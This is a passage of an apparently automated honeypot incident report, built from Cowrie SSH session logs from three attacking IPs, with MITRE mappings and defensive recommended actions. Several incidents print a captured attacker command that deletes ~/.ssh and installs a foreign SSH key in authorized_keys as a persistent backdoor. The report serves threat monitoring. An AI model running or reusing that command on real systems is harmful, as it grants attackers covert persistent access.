| `2026-06-15 00:59:36` | `cowrie.command.failed` |
| `2026-06-15 00:59:36` | `cowrie.log.closed` |
| `2026-06-15 00:59:36` | `cowrie.session.params` |
| `2026-06-15 00:59:36` | `cowrie.command.input` |
| `2026-06-15 00:59:36` | `cowrie.session.file_download` |
| `2026-06-15 00:59:36` | `cowrie.log.closed` |
| `2026-06-15 00:59:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `151.33.34[.]75` to AbuseIPDB if not already reported
- [ ] Block `151.33.34[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4df7af5976c

| Field | Detail |
|---|---|
| **Source IP** | `151.33.34[.]75` |
| **First Seen** | 2026-06-15 00:59 |
| **Last Seen** | 2026-06-15 00:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 00:59:38` | `cowrie.session.connect` |
| `2026-06-15 00:59:38` | `cowrie.client.version` |
| `2026-06-15 00:59:38` | `cowrie.client.kex` |
| `2026-06-15 00:59:39` | `cowrie.login.success` |
| `2026-06-15 00:59:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `151.33.34[.]75` to AbuseIPDB if not already reported
- [ ] Block `151.33.34[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27db50383f71

| Field | Detail |
|---|---|
| **Source IP** | `151.33.34[.]75` |
| **First Seen** | 2026-06-15 01:01 |
| **Last Seen** | 2026-06-15 01:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:01:44` | `cowrie.session.connect` |
| `2026-06-15 01:01:44` | `cowrie.client.version` |
| `2026-06-15 01:01:44` | `cowrie.client.kex` |
| `2026-06-15 01:01:45` | `cowrie.login.success` |
| `2026-06-15 01:01:45` | `cowrie.session.params` |
| `2026-06-15 01:01:45` | `cowrie.command.input` |
| `2026-06-15 01:01:45` | `cowrie.command.failed` |
| `2026-06-15 01:01:46` | `cowrie.log.closed` |
| `2026-06-15 01:01:46` | `cowrie.session.params` |
| `2026-06-15 01:01:46` | `cowrie.command.input` |
| `2026-06-15 01:01:46` | `cowrie.session.file_download` |
| `2026-06-15 01:01:46` | `cowrie.log.closed` |
| `2026-06-15 01:01:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `151.33.34[.]75` to AbuseIPDB if not already reported
- [ ] Block `151.33.34[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e70f6532792

| Field | Detail |
|---|---|
| **Source IP** | `151.33.34[.]75` |
| **First Seen** | 2026-06-15 01:01 |
| **Last Seen** | 2026-06-15 01:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:01:48` | `cowrie.session.connect` |
| `2026-06-15 01:01:48` | `cowrie.client.version` |
| `2026-06-15 01:01:48` | `cowrie.client.kex` |
| `2026-06-15 01:01:49` | `cowrie.login.success` |
| `2026-06-15 01:01:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `151.33.34[.]75` to AbuseIPDB if not already reported
- [ ] Block `151.33.34[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ed51bf408cc

| Field | Detail |
|---|---|
| **Source IP** | `4.182.219[.]135` |
| **First Seen** | 2026-06-15 01:02 |
| **Last Seen** | 2026-06-15 01:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:02:16` | `cowrie.session.connect` |
| `2026-06-15 01:02:16` | `cowrie.client.version` |
| `2026-06-15 01:02:16` | `cowrie.client.kex` |
| `2026-06-15 01:02:17` | `cowrie.login.success` |
| `2026-06-15 01:02:17` | `cowrie.session.params` |
| `2026-06-15 01:02:17` | `cowrie.command.input` |
| `2026-06-15 01:02:17` | `cowrie.command.failed` |
| `2026-06-15 01:02:17` | `cowrie.log.closed` |
| `2026-06-15 01:02:17` | `cowrie.session.params` |
| `2026-06-15 01:02:17` | `cowrie.command.input` |
| `2026-06-15 01:02:18` | `cowrie.session.file_download` |
| `2026-06-15 01:02:18` | `cowrie.log.closed` |
| `2026-06-15 01:02:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.182.219[.]135` to AbuseIPDB if not already reported
- [ ] Block `4.182.219[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee6aab62eca1

| Field | Detail |
|---|---|
| **Source IP** | `4.182.219[.]135` |
| **First Seen** | 2026-06-15 01:02 |
| **Last Seen** | 2026-06-15 01:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:02:20` | `cowrie.session.connect` |
| `2026-06-15 01:02:20` | `cowrie.client.version` |
| `2026-06-15 01:02:20` | `cowrie.client.kex` |
| `2026-06-15 01:02:20` | `cowrie.login.success` |
| `2026-06-15 01:02:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.182.219[.]135` to AbuseIPDB if not already reported
- [ ] Block `4.182.219[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-898a56436450

| Field | Detail |
|---|---|
| **Source IP** | `122.168.194[.]41` |
| **First Seen** | 2026-06-15 01:02 |
| **Last Seen** | 2026-06-15 01:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:02:26` | `cowrie.session.connect` |
| `2026-06-15 01:02:26` | `cowrie.client.version` |
| `2026-06-15 01:02:26` | `cowrie.client.kex` |
| `2026-06-15 01:02:27` | `cowrie.login.success` |
| `2026-06-15 01:02:27` | `cowrie.session.params` |
| `2026-06-15 01:02:27` | `cowrie.command.input` |
| `2026-06-15 01:02:27` | `cowrie.command.failed` |
| `2026-06-15 01:02:27` | `cowrie.log.closed` |
| `2026-06-15 01:02:27` | `cowrie.session.params` |
| `2026-06-15 01:02:27` | `cowrie.command.input` |
| `2026-06-15 01:02:27` | `cowrie.session.file_download` |
| `2026-06-15 01:02:27` | `cowrie.log.closed` |
| `2026-06-15 01:02:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.168.194[.]41` to AbuseIPDB if not already reported
- [ ] Block `122.168.194[.]41` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30c905c5bf06

| Field | Detail |
|---|---|
| **Source IP** | `122.168.194[.]41` |
| **First Seen** | 2026-06-15 01:02 |
| **Last Seen** | 2026-06-15 01:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:02:29` | `cowrie.session.connect` |
| `2026-06-15 01:02:29` | `cowrie.client.version` |
| `2026-06-15 01:02:29` | `cowrie.client.kex` |
| `2026-06-15 01:02:29` | `cowrie.login.success` |
| `2026-06-15 01:02:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.168.194[.]41` to AbuseIPDB if not already reported
- [ ] Block `122.168.194[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc56e55fb506

| Field | Detail |
|---|---|
| **Source IP** | `151.33.34[.]75` |
| **First Seen** | 2026-06-15 01:03 |
| **Last Seen** | 2026-06-15 01:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:03:52` | `cowrie.session.connect` |
| `2026-06-15 01:03:52` | `cowrie.client.version` |
| `2026-06-15 01:03:52` | `cowrie.client.kex` |
| `2026-06-15 01:03:53` | `cowrie.login.success` |
| `2026-06-15 01:03:53` | `cowrie.session.params` |
| `2026-06-15 01:03:53` | `cowrie.command.input` |
| `2026-06-15 01:03:53` | `cowrie.command.failed` |
| `2026-06-15 01:03:53` | `cowrie.log.closed` |
| `2026-06-15 01:03:53` | `cowrie.session.params` |
| `2026-06-15 01:03:53` | `cowrie.command.input` |
| `2026-06-15 01:03:53` | `cowrie.session.file_download` |
| `2026-06-15 01:03:53` | `cowrie.log.closed` |
| `2026-06-15 01:03:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `151.33.34[.]75` to AbuseIPDB if not already reported
- [ ] Block `151.33.34[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e75f2950a6b7

| Field | Detail |
|---|---|
| **Source IP** | `151.33.34[.]75` |
| **First Seen** | 2026-06-15 01:03 |
| **Last Seen** | 2026-06-15 01:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:03:56` | `cowrie.session.connect` |
| `2026-06-15 01:03:56` | `cowrie.client.version` |
| `2026-06-15 01:03:56` | `cowrie.client.kex` |
| `2026-06-15 01:03:56` | `cowrie.login.success` |
| `2026-06-15 01:03:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `151.33.34[.]75` to AbuseIPDB if not already reported
- [ ] Block `151.33.34[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26202eae37c8

| Field | Detail |
|---|---|
| **Source IP** | `4.182.219[.]135` |
| **First Seen** | 2026-06-15 01:04 |
| **Last Seen** | 2026-06-15 01:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:04:14` | `cowrie.session.connect` |
| `2026-06-15 01:04:14` | `cowrie.client.version` |
| `2026-06-15 01:04:14` | `cowrie.client.kex` |
| `2026-06-15 01:04:14` | `cowrie.login.success` |
| `2026-06-15 01:04:15` | `cowrie.session.params` |
| `2026-06-15 01:04:15` | `cowrie.command.input` |
| `2026-06-15 01:04:15` | `cowrie.command.failed` |
| `2026-06-15 01:04:15` | `cowrie.log.closed` |
| `2026-06-15 01:04:15` | `cowrie.session.params` |
| `2026-06-15 01:04:15` | `cowrie.command.input` |
| `2026-06-15 01:04:15` | `cowrie.session.file_download` |
| `2026-06-15 01:04:15` | `cowrie.log.closed` |
| `2026-06-15 01:04:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.182.219[.]135` to AbuseIPDB if not already reported
- [ ] Block `4.182.219[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca6c26fc5fb4

| Field | Detail |
|---|---|
| **Source IP** | `4.182.219[.]135` |
| **First Seen** | 2026-06-15 01:04 |
| **Last Seen** | 2026-06-15 01:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:04:17` | `cowrie.session.connect` |
| `2026-06-15 01:04:17` | `cowrie.client.version` |
| `2026-06-15 01:04:18` | `cowrie.client.kex` |
| `2026-06-15 01:04:18` | `cowrie.login.success` |
| `2026-06-15 01:04:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.182.219[.]135` to AbuseIPDB if not already reported
- [ ] Block `4.182.219[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f457f7057131

| Field | Detail |
|---|---|
| **Source IP** | `122.168.194[.]41` |
| **First Seen** | 2026-06-15 01:04 |
| **Last Seen** | 2026-06-15 01:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:04:33` | `cowrie.session.connect` |
| `2026-06-15 01:04:33` | `cowrie.client.version` |
| `2026-06-15 01:04:33` | `cowrie.client.kex` |
| `2026-06-15 01:04:33` | `cowrie.login.success` |
| `2026-06-15 01:04:33` | `cowrie.session.params` |
| `2026-06-15 01:04:33` | `cowrie.command.input` |
| `2026-06-15 01:04:33` | `cowrie.command.failed` |
| `2026-06-15 01:04:33` | `cowrie.log.closed` |
| `2026-06-15 01:04:33` | `cowrie.session.params` |
| `2026-06-15 01:04:33` | `cowrie.command.input` |
| `2026-06-15 01:04:33` | `cowrie.session.file_download` |
| `2026-06-15 01:04:33` | `cowrie.log.closed` |
| `2026-06-15 01:04:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.168.194[.]41` to AbuseIPDB if not already reported
- [ ] Block `122.168.194[.]41` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23d63436b0ca

| Field | Detail |
|---|---|
| **Source IP** | `122.168.194[.]41` |
| **First Seen** | 2026-06-15 01:04 |
| **Last Seen** | 2026-06-15 01:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:04:35` | `cowrie.session.connect` |
| `2026-06-15 01:04:35` | `cowrie.client.version` |
| `2026-06-15 01:04:35` | `cowrie.client.kex` |
| `2026-06-15 01:04:35` | `cowrie.login.success` |
| `2026-06-15 01:04:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.168.194[.]41` to AbuseIPDB if not already reported
- [ ] Block `122.168.194[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2a656cc0f7f

| Field | Detail |
|---|---|
| **Source IP** | `4.182.219[.]135` |
| **First Seen** | 2026-06-15 01:06 |
| **Last Seen** | 2026-06-15 01:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:06:09` | `cowrie.session.connect` |
| `2026-06-15 01:06:09` | `cowrie.client.version` |
| `2026-06-15 01:06:09` | `cowrie.client.kex` |
| `2026-06-15 01:06:10` | `cowrie.login.success` |
| `2026-06-15 01:06:10` | `cowrie.session.params` |
| `2026-06-15 01:06:10` | `cowrie.command.input` |
| `2026-06-15 01:06:10` | `cowrie.command.failed` |
| `2026-06-15 01:06:10` | `cowrie.log.closed` |
| `2026-06-15 01:06:11` | `cowrie.session.params` |
| `2026-06-15 01:06:11` | `cowrie.command.input` |
| `2026-06-15 01:06:11` | `cowrie.session.file_download` |
| `2026-06-15 01:06:11` | `cowrie.log.closed` |
| `2026-06-15 01:06:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.182.219[.]135` to AbuseIPDB if not already reported
- [ ] Block `4.182.219[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87e7d3d76991

| Field | Detail |
|---|---|
| **Source IP** | `4.182.219[.]135` |
| **First Seen** | 2026-06-15 01:06 |
| **Last Seen** | 2026-06-15 01:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:06:13` | `cowrie.session.connect` |
| `2026-06-15 01:06:13` | `cowrie.client.version` |
| `2026-06-15 01:06:13` | `cowrie.client.kex` |
| `2026-06-15 01:06:14` | `cowrie.login.success` |
| `2026-06-15 01:06:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.182.219[.]135` to AbuseIPDB if not already reported
- [ ] Block `4.182.219[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6566fb442bff

| Field | Detail |
|---|---|
| **Source IP** | `4.182.219[.]135` |
| **First Seen** | 2026-06-15 01:07 |
| **Last Seen** | 2026-06-15 01:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:07:57` | `cowrie.session.connect` |
| `2026-06-15 01:07:57` | `cowrie.client.version` |
| `2026-06-15 01:07:58` | `cowrie.client.kex` |
| `2026-06-15 01:07:58` | `cowrie.login.success` |
| `2026-06-15 01:07:58` | `cowrie.session.params` |
| `2026-06-15 01:07:58` | `cowrie.command.input` |
| `2026-06-15 01:07:58` | `cowrie.command.failed` |
| `2026-06-15 01:07:59` | `cowrie.log.closed` |
| `2026-06-15 01:07:59` | `cowrie.session.params` |
| `2026-06-15 01:07:59` | `cowrie.command.input` |
| `2026-06-15 01:07:59` | `cowrie.session.file_download` |
| `2026-06-15 01:07:59` | `cowrie.log.closed` |
| `2026-06-15 01:08:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.182.219[.]135` to AbuseIPDB if not already reported
- [ ] Block `4.182.219[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2407692d928

| Field | Detail |
|---|---|
| **Source IP** | `4.182.219[.]135` |
| **First Seen** | 2026-06-15 01:08 |
| **Last Seen** | 2026-06-15 01:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:08:01` | `cowrie.session.connect` |
| `2026-06-15 01:08:01` | `cowrie.client.version` |
| `2026-06-15 01:08:01` | `cowrie.client.kex` |
| `2026-06-15 01:08:02` | `cowrie.login.success` |
| `2026-06-15 01:08:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.182.219[.]135` to AbuseIPDB if not already reported
- [ ] Block `4.182.219[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25cb96dda040

| Field | Detail |
|---|---|
